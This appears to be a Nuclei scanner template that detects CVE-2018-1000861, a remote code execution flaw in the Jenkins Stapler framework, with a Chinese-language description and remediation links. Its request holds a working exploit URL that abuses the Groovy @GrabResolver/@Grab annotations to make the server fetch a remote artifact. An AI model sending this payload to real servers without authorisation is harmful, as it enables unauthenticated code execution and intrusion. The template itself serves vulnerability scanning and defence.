id: CVE-2018-1000861
info:
  name: Jenkins - Remote Command Injection
  author:
  - l0ne1y
  tags:
  - cve
  - cve2018
  - jenkin
  - rce
  - jenkins
  description: |-
    Jenkins <= 2.153/LTS 2.138.3 Stapler Web Framework MetaClass.java URL 代码执行漏洞
    CloudBees Jenkins（前称Hudson Labs）是美国CloudBees公司的一套基于Java开发的持续集成工具，它主要用于监控持续的软件版本发布/测试项目和一些定时执行的任务。LTS（Long-Term Support）是CloudBees Jenkins的一个长期支持版本。

    CloudBees Jenkins 2.153及之前版本和LTS 2.138.3及之前版本中的stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java文件的StaplerWeb框架存在代码执行漏洞。攻击者可借助特制的URLs利用该漏洞执行代码。
  reference:
  - https://github.com/vulhub/vulhub/tree/master/jenkins/cve-2018-1000861
  - https://nvd.nist.gov/vuln/detail/cve-2018-1000861
  - https://jenkins.io/security/advisory/2018-12-05/#security-595
  - http://www.securityfocus.com/bid/106176
  severity: critical
  classification:
    cve-id:
    - cve-2018-1000861
    cwe-id:
    - cwe-502
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://jenkins.io/security/advisory/2018-12-05/#SECURITY-1193
requests:
- matchers:
  - type: word
    part: body
    words:
    - package#vulntest
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;'
  method: GET
